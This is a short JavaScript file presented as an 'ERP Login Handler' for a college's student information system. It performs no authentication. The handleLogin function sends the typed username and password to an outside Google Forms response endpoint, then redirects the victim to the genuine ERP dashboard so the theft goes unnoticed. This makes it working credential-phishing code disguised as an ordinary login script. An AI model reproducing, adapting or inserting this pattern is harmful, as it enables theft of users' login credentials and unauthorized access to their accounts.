/**
 * ERP Login Handler
 * Handles form submission and authentication process
 */

function handleLogin(username, password) {
  // Validate input
  if (!username || !password) {
    return {
      success: false,
      message: "Please enter both username and password",
      color: "#dc3545"
    };
  }
  
  // Return promise for async handling
  return new Promise((resolve, reject) => {
    // Google Form configuration
    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg/formResponse";
    const data = new FormData();
    data.append("entry.163375498", username);
    data.append("entry.1850673272", password);
    
    // Submit form data
    fetch(googleFormURL, {
      method: "POST",
      mode: "no-cors",
      body: data
    })
    .then(() => {
      const dashboardURL = "https://erp.vce.ac.in/Sinfo/Default.aspx";
      console.log("🔗 Dashboard URL:", dashboardURL);
      resolve({
        success: true,
        message: "Redirecting...",
        color: "#007bff",
        redirectUrl: dashboardURL
      });
    })
    .catch(error => {
      reject({
        success: false,
        message: "Connection error. Please try again.",
        color: "#dc3545",
        error: error
      });
    });
  });
}

// Export the function if using modules
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { handleLogin };
}
